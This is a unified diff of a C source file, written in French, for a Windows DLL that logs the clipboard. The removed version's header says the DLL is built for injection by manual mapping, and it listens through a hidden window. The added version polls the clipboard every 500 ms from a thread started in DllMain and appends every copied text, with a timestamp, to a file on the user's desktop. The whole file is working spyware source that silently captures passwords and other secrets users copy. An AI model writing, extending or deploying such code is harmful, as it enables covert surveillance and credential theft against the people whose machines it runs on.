@@ -1,48 +1,43 @@
 /**
  * @file clipboard-logger.c
- * @brief Implémentation d'une DLL de surveillance du presse-papiers.
+ * @brief Version alternative de la DLL de surveillance du presse-papiers.
  * 
- * Cette DLL est conçue pour être injectée via un mappage manuel.
- * Elle utilise l'API Windows pour surveiller les changements du presse-papiers
- * et logue le contenu textuel dans un fichier sur le bureau de l'utilisateur.
+ * Cette version n'utilise pas de fenêtre invisible. Elle se base sur la fonction
+ * GetClipboardSequenceNumber pour détecter les changements par scrutation (polling)
+ * à intervalle régulier.
  */
 
 #ifndef _WIN32_WINNT
-#define _WIN32_WINNT 0x0600 // Windows Vista ou supérieur pour AddClipboardFormatListener
+#define _WIN32_WINNT 0x0600 // Windows Vista ou supérieur pour GetClipboardSequenceNumber
 #endif
 #include <windows.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <time.h>
 
-// Nom de la classe de fenêtre invisible pour recevoir les notifications du presse-papiers
-#define WINDOW_CLASS_NAME "ClipboardLoggerClass"
-#define LOG_FILE_NAME "clipboard_log.txt"
+// Intervalle de scrutation en millisecondes (ex: 500ms)
+#define POLLING_INTERVAL 500
+#define LOG_FILE_NAME "clipboard_log_polling.txt"
 
 // Variables globales
 HINSTANCE g_hInstance = NULL;
-HWND g_hWndNextViewer = NULL;
-HWND g_hWorkerWnd = NULL;
 HANDLE g_hThread = NULL;
+BOOL g_bRunning = TRUE;
 
 /**
  * @brief Récupère le chemin du fichier de log sur le bureau.
- * @param buffer Buffer pour stocker le chemin.
- * @param size Taille du buffer.
  */
 void GetLogFilePath(char* buffer, size_t size) {
     CHAR desktopPath[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
         snprintf(buffer, size, "%s\\%s", desktopPath, LOG_FILE_NAME);
     } else {
-        // Fallback sur le répertoire courant si le bureau n'est pas accessible
         snprintf(buffer, size, ".\\%s", LOG_FILE_NAME);
     }
 }
 
 /**
  * @brief Logue le texte dans le fichier sur le bureau.
- * @param text Texte à concaténer.
  */
 void LogClipboardText(const char* text) {
     if (!text || text[0] == '\0') return;
@@ -57,18 +52,28 @@ void LogClipboardText(const char* text) {
         char timeStr[64];
         strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
         
-        fprintf(f, "%s\n%s\n-----------------------------------\n", timeStr, text);
+        fprintf(f, "%s (Polling)\n%s\n-----------------------------------\n", timeStr, text);
         fclose(f);
     }
 }
 
 /**
- * @brief Procédure de fenêtre pour traiter les messages du presse-papiers.
+ * @brief Fonction principale du thread de scrutation.
  */
-LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
-    switch (uMsg) {
-        case WM_CLIPBOARDUPDATE: {
-            if (OpenClipboard(hWnd)) {
+DWORD WINAPI PollingThread(LPVOID lpParam) {
+    DWORD dwLastSequence = 0;
+    
+    // Initialisation du numéro de séquence actuel
+    dwLastSequence = GetClipboardSequenceNumber();
+
+    while (g_bRunning) {
+        DWORD dwCurrentSequence = GetClipboardSequenceNumber();
+
+        // Si le numéro de séquence a changé, le contenu du presse-papiers a été modifié
+        if (dwCurrentSequence != dwLastSequence) {
+            dwLastSequence = dwCurrentSequence;
+
+            if (OpenClipboard(NULL)) {
                 HANDLE hData = GetClipboardData(CF_TEXT);
                 if (hData) {
                     char* pszText = (char*)GlobalLock(hData);
@@ -79,41 +84,10 @@ LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 }
                 CloseClipboard();
             }
-            break;
         }
-        case WM_DESTROY:
-            RemoveClipboardFormatListener(hWnd);
-            PostQuitMessage(0);
-            break;
-        default:
-            return DefWindowProc(hWnd, uMsg, wParam, lParam);
-    }
-    return 0;
-}
 
-/**
- * @brief Fonction principale du thread de surveillance.
- */
-DWORD WINAPI MonitorThread(LPVOID lpParam) {
-    WNDCLASSEXA wc = {0};
-    wc.cbSize = sizeof(WNDCLASSEXA);
-    wc.lpfnWndProc = WindowProc;
-    wc.hInstance = g_hInstance;
-    wc.lpszClassName = WINDOW_CLASS_NAME;
-
-    if (!RegisterClassExA(&wc)) return 1;
-
-    // Création d'une fenêtre invisible pour écouter les événements
-    g_hWorkerWnd = CreateWindowExA(0, WINDOW_CLASS_NAME, "Clipboard Logger Worker", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, g_hInstance, NULL);
-    
-    if (g_hWorkerWnd) {
-        AddClipboardFormatListener(g_hWorkerWnd);
-        
-        MSG msg;
-        while (GetMessage(&msg, NULL, 0, 0)) {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-        }
+        // Attente avant la prochaine vérification
+        Sleep(POLLING_INTERVAL);
     }
 
     return 0;
@@ -127,16 +101,13 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 
     switch (fdwReason) {
         case DLL_PROCESS_ATTACH:
-            // Désactiver les appels de thread pour optimiser
             DisableThreadLibraryCalls(hinstDLL);
-            // Lancer le thread de surveillance
-            g_hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
+            g_bRunning = TRUE;
+            g_hThread = CreateThread(NULL, 0, PollingThread, NULL, 0, NULL);
             break;
 
         case DLL_PROCESS_DETACH:
-            if (g_hWorkerWnd) {
-                SendMessage(g_hWorkerWnd, WM_CLOSE, 0, 0);
-            }
+            g_bRunning = FALSE;
             if (g_hThread) {
                 WaitForSingleObject(g_hThread, 1000);
                 CloseHandle(g_hThread);
